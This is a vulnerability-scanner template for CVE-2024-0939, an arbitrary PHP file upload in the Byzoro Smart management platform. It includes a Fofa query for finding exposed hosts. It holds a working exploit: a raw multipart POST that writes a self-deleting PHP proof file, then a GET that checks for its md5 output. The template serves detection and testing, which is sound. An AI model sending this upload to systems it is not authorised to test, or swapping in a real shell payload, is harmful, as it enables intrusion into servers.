id: CVE-2024-0939

info:
  name: Smart管理平台多版本任意文件上传
  author: zan8in
  severity: critical
  description: |
    Fofa: "Smart管理平台"
  reference:
    - https://mp.weixin.qq.com/s/Z9YR9BWSBFFdR1j0W9GRFg
  tags: Byzoro-Smart
flow: |
  http("r0") && http("r1")

variables:
  randstr: "{{rand_base(6)}}"
  rboundary: "{{rand_base(8)}}"

http:
  - id: "r0"
    raw:
      - |
        POST /Tool/uploadfile.php? HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}

        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="file_upload"; filename="contents.php"
        Content-Type: application/octet-stream
        
        <?php echo(md5(123));unlink(__FILE__);?>
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="txt_path"
        
        /home/{{randstr}}.php
        ------WebKitFormBoundary{{rboundary}}--
        

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
        internal: true
        condition: and

  - id: "r1"
    raw:
      - |
        GET /home/{{randstr}}.php HTTP/1.1
        Host: {{Hostname}}

        

    matchers:
      - type: dsl
        dsl:
          - contains(body,"202cb962ac59075b964b07152d234")
        condition: and

